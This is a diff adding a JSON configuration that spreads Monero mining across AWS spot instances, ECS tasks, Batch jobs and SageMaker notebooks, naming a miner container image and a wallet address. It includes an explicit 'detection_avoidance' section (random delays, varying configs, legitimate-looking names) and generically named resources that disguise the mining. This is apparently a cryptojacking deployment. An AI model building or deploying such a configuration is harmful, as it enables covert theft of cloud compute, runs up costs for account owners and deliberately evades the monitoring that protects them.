@@ -1,0 +1,23 @@
+{
+  "spot_instances": "6",
+  "ecs_tasks": "8",
+  "batch_jobs": "5",
+  "sagemaker_instances": "2",
+
+  "ec2_instance_type": "c6i.xlarge",
+  "ecs_cluster_name": "rm-parametrized-cluster",
+  "ecs_task_def_name": "rm-parametrized-task",
+  "batch_env_name": "rm-parametrized-batch-env",
+  "sagemaker_notebook_name": "rm-parametrized-analysis-notebook",
+  
+  "miner_image": "pmietlicki/monero-miner",
+  "wallet": "489KnAdB4s1VyjdgsWVzEpbJ4i69zQL6WSPJpi47pZ6Z6cyAGSrF74fPy3nuA73dozAK4WehY4FQhCJECV4YE1rQ47kMiB5",
+  
+  "mining_algorithm": "randomx",
+  "target_coin": "XMR",
+  "detection_avoidance": {
+    "random_delays": true,
+    "varying_configs": true,
+    "legitimate_names": true
+  }
+}
